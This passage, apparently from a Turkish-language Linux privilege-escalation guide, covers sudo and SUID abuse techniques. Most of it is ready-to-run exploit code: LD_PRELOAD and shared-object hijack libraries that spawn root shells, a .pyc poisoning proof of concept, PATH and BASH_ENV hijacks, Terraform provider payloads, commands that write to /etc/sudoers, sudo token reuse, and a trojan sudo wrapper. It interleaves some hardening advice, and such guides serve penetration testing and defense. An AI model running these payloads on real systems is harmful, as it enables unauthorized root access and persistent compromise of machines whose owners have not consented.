Çağıran, dilimlenecek `.3mf` projeyi seçebiliyorsa, `prusaslicer` veya `prusa-slicer` için kısıtlanmamış ve root yetkisiyle çalışabilen bir sudo izni incelenmelidir. Bir proje, G-code dışa aktarılırken çalıştırılan bir son işleme script'i içerebilir; özel hazırlanmış projeler, 2.6.1'e kadar PrusaSlicer üzerinden komut çalıştırabilir ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Yetki sınırına gerçekten ulaşılabilir sonucuna varmadan önce etkin sudo kuralını, binary sürümünü ve üretici yamalarını, projenin kaynağını ve ilgili dışa aktarma yolunun çalışıp çalışmadığını doğrulayın. Sabit bir proje argümanı veya etkin bir `NOEXEC` politikası sonucu değiştirebilir. Slicer'ın kurulu olduğunu bulmak, tek başına bir ayrıcalık yükseltme yolu olduğunu kanıtlamaz.

### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, **HTB makinesi Admirer** temel alınarak hazırlanmıştı ve script root olarak çalıştırılırken rastgele bir Python kütüphanesi yüklemek için **PYTHONPATH hijacking** saldırısına karşı **savunmasızdı**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo tarafından izin verilen Python import’larında yazılabilir `__pycache__` / `.pyc` poisoning

**sudo tarafından izin verilen bir Python script’i**, package dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü import ediyorsa, önbelleğe alınmış `.pyc` dosyasını değiştirip sonraki import sırasında ayrıcalıklı kullanıcı olarak code execution elde edebilirsiniz.<sup>[[30]](#references)</sup>

- Neden işe yarar:
  - CPython, bytecode önbelleklerini `__pycache__/module.cpython-<ver>.pyc` konumunda saklar.<sup>[[31]](#references)</sup>
  - Interpreter **header**’ı (magic + kaynağa bağlı timestamp/hash metadata) doğrular, ardından bu header’dan sonra saklanan marshaled code object’i yürütür.
  - Dizin yazılabilir olduğu için önbelleğe alınmış dosyayı **silebilir ve yeniden oluşturabilirseniz**, root’a ait ancak yazılamayan bir `.pyc` dosyası yine de değiştirilebilir.
- Tipik yol:
  - `sudo -l`, root olarak çalıştırabileceğiniz bir Python script’i veya wrapper gösterir.
  - Bu script, `/opt/app/`, `/usr/local/lib/...` vb. konumlardan yerel bir modülü import eder.
  - Import edilen modülün `__pycache__` dizini sizin kullanıcınız veya herkes tarafından yazılabilir.

Hızlı enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ayrıcalıklı betiği inceleyebiliyorsanız, içe aktarılan modülleri ve önbellek yolunu belirleyin:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse iş akışı:

1. Python'ın henüz yoksa geçerli cache dosyasını oluşturması için sudo izni olan script'i bir kez çalıştırın.
2. Geçerli `.pyc` dosyasının ilk 16 baytını okuyup zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, orijinal cache dosyasını silin ve orijinal header'ı kötü amaçlı bytecode'unuzla birleştirerek dosyayı yeniden oluşturun.
4. Payload'unuzun root olarak çalışması için sudo izni olan script'i yeniden çalıştırın.

Önemli notlar:

- Orijinal header'ı yeniden kullanmak önemlidir; çünkü Python, cache metadata'sını bytecode gövdesinin kaynak dosyayla gerçekten eşleşip eşleşmediğine göre değil, kaynak dosyaya göre denetler.
- Bu yöntem, kaynak dosya root'a ait ve yazılamazken onu içeren `__pycache__` dizini yazılabilir olduğunda özellikle kullanışlıdır.
- `PYTHONDONTWRITEBYTECODE=1` ve `python -B`, Python'ın yeni `.pyc` dosyaları yazmasını engeller; önceden var olan ve saldırgan tarafından değiştirilmiş geçerli bir cache'i yüklemesini **engellemez**. Kritik sınır, düşük ayrıcalıklı bir kullanıcının ayrıcalıklı import'un kabul edeceği bir cache'i değiştirip değiştiremeyeceğidir. Python, önbelleğe alınmış bytecode'u yüklemeden önce zaman damgası/boyut veya hash metadata'sını denetler. [Python import referansına](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) ve [komut satırı belgelerine](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) bakın.

Minimal proof-of-concept taslağı:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Root ayrıcalıklarına sahip Python import path’indeki hiçbir dizinin, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Mevcut `.pyc` dosyaları dahil olmak üzere cache dizinlerinin sahipliğini ve izinlerini denetleyin. Bytecode yazmayı devre dışı bırakmak yeni cache oluşturulmasını azaltabilir, ancak değiştirilebilir mevcut bir cache’i etkisiz hâle getirmez.
- Yazılabilir yerel Python modüllerini ve yazılabilir cache dizinlerini, root tarafından çalıştırılan yazılabilir shell script’leri veya paylaşılan kütüphanelerle aynı şekilde ele alın.

### sudo env_keep üzerinden korunan BASH_ENV → root shell

sudoers `BASH_ENV` değişkenini koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komut çalıştırıldığında root olarak keyfi kod çalıştırmak için Bash’in etkileşimsiz başlangıç davranışından yararlanabilirsiniz.<sup>[[24]](#references)</sup>

- Neden çalışır: Etkileşimsiz shell’lerde Bash, hedef script’i çalıştırmadan önce `$BASH_ENV` değerini değerlendirir ve o dosyayı kaynak olarak yükler. Birçok sudo kuralı bir script’in veya shell wrapper’ının çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla kaynak olarak yüklenir.<sup>[[23]](#references)</sup>

- Gereksinimler:
  - Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script’i).
  - `BASH_ENV` değişkeninin `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Sertleştirme:
  - `BASH_ENV` (ve `ENV`) değişkenlerini `env_keep` listesinden çıkarın, `env_reset` kullanmayı tercih edin.
  - `sudo` ile izin verilen komutlar için shell wrapper'larından kaçının; minimal binary'ler kullanın.
  - Korunan env var'ları kullanıldığında sudo I/O logging ve uyarı mekanizmalarını değerlendirin.

### Korunmuş HOME ile sudo üzerinden Terraform (!env_reset)

`sudo`, Terraform'ın daha ayrıcalıklı bir kullanıcı olarak çalışmasına izin verdiğinde, `!env_reset` o özel kuralda gerçekte hangi environment variable'ların korunduğunu kontrol etmeniz gerektiğine dair bir ipucudur. Çağıran kullanıcının yazabildiği bir `.terraformrc` veya `terraform.rc` dosyasını etkin CLI configuration olarak kabul etmeden önce, etkili `HOME` veya `TF_CLI_CONFIG_FILE` değerini doğrulayın. `provider_installation.dev_overrides` girdisi yalnızca sabitlenmiş Terraform komutu o provider'ı yüklerse ve çağıran kullanıcı executable dosyasını seçilen dizine koyabiliyorsa önem taşır.<sup>[[25]](#references)</sup>

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider'ın adını taşıyan kötü amaçlı bir plugin bırakın (örn. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform, Go plugin handshake işlemini başarısız kılar ancak kapanmadan önce payload’ı root olarak çalıştırıp geride bir SUID shell bırakır.

### TF_VAR geçersiz kılmaları + symlink doğrulama atlatması

Belirli sudo kuralı ilgili değişkenleri koruyorsa Terraform değişkenleri `TF_VAR_<name>` ortam değişkenleriyle sağlanabilir. Kaynak symlink’inden **okuma** için ayrıca bağlantıyı izleyen ve korumalı sonucu çağıranın okuyabileceği bir hedefe kopyalayan bir provider gerekir. Hedef symlink’ine **yazma** ise ayrı olarak çağıranın kontrol ettiği bir hedef girdisi ve yazma sırasında bu bağlantıyı izleyen ayrıcalıklı bir provider gerektirir; daha sonra çalışan zamanlanmış bir iş bunun olası sonuçlarından yalnızca biridir. Bu yöntemlerden herhangi birini denemeden önce `sudo -l`, `stat` ve `readlink` gibi salt okunur komutlarla tam sudo iznini, ilgili `.tf` dosyalarını, seçili CLI yapılandırmasını ve yolların sahipliğini inceleyin. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf sözcüksel doğrulamalar symlink’leri çözümlemez:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink'i çözümler ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak ayrıcalıklı yollara **yazmak** için de kullanılabilir (ör. sağlayıcının hedef yolunu `/etc/cron.d/` içini gösterecek şekilde ayarlamak).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, sudo'nun yalnızca etkileşimli bir TTY üzerinden çalışmasını zorunlu kılan `requiretty` ile yapılandırılabilir. `!requiretty` ayarlanmışsa (veya seçenek yoksa) sudo; reverse shell'ler, cron işleri veya betikler gibi etkileşimsiz bağlamlardan çalıştırılabilir.

```bash
Defaults !requiretty
```

Bu tek başına doğrudan bir güvenlik açığı değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları artırır.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

`sudo -l` çıktısında `env_keep+=PATH` veya saldırganın yazabildiği girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görünüyorsa, sudo ile çalıştırılmasına izin verilen hedefin içindeki yolu belirtilmemiş harici bir komutun yerine başka bir komut kullanılabilir.<sup>[[3]](#references)</sup> Etkin bir `secure_path` bulunmaması da **yalnızca** komutun sudo ortamında çağıranın denetimindeki bir `PATH` değerini koruyorsa incelenmelidir; tek başına yokluğu bunun gerçekleştiğini kanıtlamaz. İzin verilen script'i çalıştırmadan okuyun, ardından tam RunAs ve argüman kuralını, etkin komut arama yolunu ve komut adıyla eşleşen, daha önce aranan, yazılabilir ve geçilebilir bir dizin bulunduğunu doğrulayın. Kimlik doğrulama, `NOEXEC`, shell yerleşik komutları ve mutlak komut yolları sonucu değiştirebilir.

- Gereksinimler: Yolu mutlak olarak belirtilmeyen komutları (`free`, `df`, `ps` vb.) çağıran bir script/binary çalıştıran bir sudo kuralı (çoğunlukla `NOPASSWD`) ve önce aranan, yazılabilir bir PATH girdisi.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo'da yolları atlayarak komut çalıştırma
Başka dosyaları okumak veya **symlinks** kullanmak için **Jump** yapın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Bir **wildcard** (\*) kullanılırsa daha da kolaydır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeyen Sudo komutu/SUID binary

**sudo izni** tek bir komut için **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu exploit edebilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu teknik, **suid** binary **yolu belirtmeden başka bir komut çalıştırıyorsa da kullanılabilir (tuhaf bir SUID binary'nin içeriğini her zaman** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

**suid** binary **yolu belirterek başka bir komut çalıştırıyorsa**, SUID dosyasının çağırdığı komutun adını taşıyan bir **function export etmeyi** deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function'ı oluşturup export etmeyi denemelisiniz:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ardından, suid binary'yi çağırdığınızda bu fonksiyon çalıştırılır

### Özel SUID copy wrapper'ları

Kaynak ve hedef yolları kabul eden, root sahipliğindeki bir SUID aracı iki farklı güven sınırını aşabilir. Her iki argümandan da bir shell komutu oluşturursa (örneğin, oluşturduğu bir `cp` komutunu `system()`'e ileterek), shell metakarakterleri etkili ayrıcalıklarıyla başka bir komut çalıştırabilir. `cp`'yi shell kullanmadan güvenli biçimde çağırsa bile, kısıtlanmamış bir hedef `/etc/passwd` gibi dosyalara ayrıcalıklı yazma olanağı sağlayabilir. Wrapper'ın argüman işleme biçimini, effective UID davranışını, hedef kısıtlamalarını ve kopyalanan dosyanın içeriğinin çağıran tarafından belirlenip belirlenemediğini inceleyin; genel bir `cp` hatası veya tek başına SUID biti, bu yollardan herhangi birinin varlığını kanıtlamaz. Herhangi bir manuel testten önce binary'yi ve izinlerini pasif biçimde listeleyin.

### SUID wrapper tarafından çalıştırılan yazılabilir script

Özel bir uygulamada sık görülen bir yanlış yapılandırma, root sahipliğinde olup bir script çalıştıran SUID binary wrapper'ın, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmasıdır.

Tipik örüntü:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutlarını ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Hızlı kontroller:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Bu saldırı yolu, özellikle `/usr/local/bin` içinde sunulan "maintenance"/"backup" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyiciye standart C kütüphanesi (`libc.so`) dahil diğer tüm kütüphanelerden önce yüklenecek bir veya daha fazla paylaşımlı kütüphane (.so dosyası) belirtmek için kullanılır. Bu işlem, bir kütüphaneyi önceden yükleme olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin kötüye kullanılmasını, özellikle **suid/sgid** yürütülebilir dosyalarında önlemek için sistem belirli koşullar uygular:

- Gerçek kullanıcı kimliği (_ruid_) etkili kullanıcı kimliğiyle (_euid_) eşleşmeyen yürütülebilir dosyalarda yükleyici **LD_PRELOAD** değişkenini dikkate almaz.
- suid/sgid içeren yürütülebilir dosyalarda yalnızca standart yollardaki ve kendileri de suid/sgid olan kütüphaneler önceden yüklenir.

`sudo` ile komut yürütme yetkiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi bulunuyorsa ayrıcalık yükseltme mümkün olabilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin kalıcı olmasına ve komutlar `sudo` ile çalıştırıldığında da tanınmasına izin vererek yükseltilmiş ayrıcalıklarla rastgele kod yürütülmesine yol açabilir.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Şu adla kaydedin **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Ardından **şunu kullanarak derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, çalıştırarak **yetkileri yükseltin**

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa benzer bir privesc yöntemi kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu kontrol eder.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, exploit için potansiyel bir fırsata işaret eder.

Bunu exploit etmek için, _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturup içine aşağıdaki kodu yazabilirsiniz:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlenip çalıştırıldığında dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını aşağıdaki komutla bir shared object (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetikleyerek sistemin olası biçimde ele geçirilmesine olanak tanır.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Artık yazabildiğimiz bir dizinden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli ada sahip kütüphaneyi bu dizinde oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Bunun gibi bir hata alırsanız

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir saldırganın yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komuta **yalnızca argüman enjekte edebildiğiniz** durumlar için aynı şeyi sunar.

Proje; kısıtlı shell'lerden çıkmak, yükseltilmiş ayrıcalıkları elde etmek veya korumak, dosya aktarmak, bind ve reverse shell'ler başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru işlevlerini derler.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralının nasıl istismar edilebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo erişiminiz** olduğu ancak parolayı bilmediğiniz durumlarda, bir sudo komutunun çalıştırılmasını bekleyip oturum token'ını ele geçirerek ayrıcalıklarınızı yükseltebilirsiniz.<sup>[[18]](#references)</sup>

Ayrıcalıkları yükseltmek için gerekenler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'iniz olmalı
- "_sampleuser_" son **15 dakika içinde** bir şeyi çalıştırmak için **`sudo` kullanmış** olmalı (varsayılan olarak bu, herhangi bir parola girmeden `sudo` kullanmamıza izin veren sudo token'ının geçerlilik süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` komutunun çıktısı 0 olmalı
- `gdb` erişilebilir olmalı (aracı yükleyebilmeniz gerekir)

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutuyla `ptrace_scope` ayarını geçici olarak etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` değerini ayarlayabilirsiniz.)

Tüm bu gereksinimler karşılanıyorsa, **ayrıcalıklarınızı şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturur. Bunu **oturumunuzdaki sudo token'ını etkinleştirmek** için kullanabilirsiniz (otomatik olarak bir root shell almazsınız; `sudo su` komutunu çalıştırın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid biti ayarlanmış** bir sh shell oluşturur.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **third exploit** (`exploit_v3.sh`) **bir sudoers dosyası oluşturur**; bu dosya **sudo token'larını süresiz hâle getirir ve tüm kullanıcıların sudo kullanmasına izin verir**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Klasörde veya klasörün içindeki oluşturulmuş dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token oluşturmak** üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary'sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyorsanız ve o kullanıcı olarak PID'si 1234 olan bir shell'iniz varsa, parolayı bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo`yu kimin ve nasıl kullanabileceğini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu** dosyayı **okuyabilirseniz**, **ilginç bilgiler elde edebilirsiniz**; herhangi bir dosyaya **yazabilirseniz** **yetki yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Yazabiliyorsan bu izni kötüye kullanabilirsin.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine alternatifler vardır. Yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas` bir düzenleyiciye veya yorumlayıcıya izin veriyorsa GTFOBins tarzı kaçışları kontrol edin:

```bash
doas vim
:!/bin/sh
```

Ayrıca, orijinal Python tabanlı `dstat` için root yetkisi verebilen bir `doas` kuralı, eklenti yollarının incelenmesini de gerektirir. [Kılavuzunda](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) ve [kaynak kodunda](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` eklentilerinin bulunabileceği konumlar arasında `/usr/share/dstat/` ve `/usr/local/share/dstat/` listelenir. Mevcut kullanıcı, kurulu derlemenin gerçekten kullandığı bir konuma yazma ve arama iznine sahipse, seçilen bir eklenti `doas` RunAs kimliğiyle çalışabilir. Etkin kuralı, bu derlemedeki eklenti arama davranışını, dizin ve üst dizin izinlerini veya ACL’leri ve çağıranın eklenti seçip seçemediğini doğrulayın; yalnızca bir `dstat` kuralının veya yazılabilir dizinin varlığı, bir ipucundan ibarettir. Diğer `dstat` uygulamaları farklı eklenti sistemleri kullanabilir. Eklenti yüklemeden meta verileri pasif biçimde inceleyin.

### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalıklarını yükseltmek için `sudo` kullandığını** biliyorsanız ve bu kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak çalıştırıp ardından kullanıcının komutunu yürütecek **yeni bir sudo çalıştırılabilir dosyası oluşturabilirsiniz**. Ardından, kullanıcı `sudo` çalıştırdığında sizin sudo çalıştırılabilir dosyanızın yürütülmesi için kullanıcı bağlamındaki **$PATH’i değiştirin** (örneğin, `.bash_profile` dosyasına yeni yolu ekleyerek).

Kullanıcı farklı bir shell kullanıyorsa (bash değilse), yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc` ve `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) dosyasında bulabilirsiniz.

Ya da şuna benzer bir şey çalıştırabilirsiniz:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` konumundaki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **aranacağı** diğer klasörleri gösterir. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin `/usr/local/lib` içinde kütüphane arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** belirtilen yollardan herhangi birinde yazma izni varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör, ayrıcalıklarını yükseltebilir.\
**Bu yanlış yapılandırmanın nasıl istismar edileceğine** aşağıdaki sayfadan göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib` dosyasını `/var/tmp/flag15/` içine kopyaladığınızda, program `RPATH` değişkeninde belirtildiği üzere bu konumdaki dosyayı kullanır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
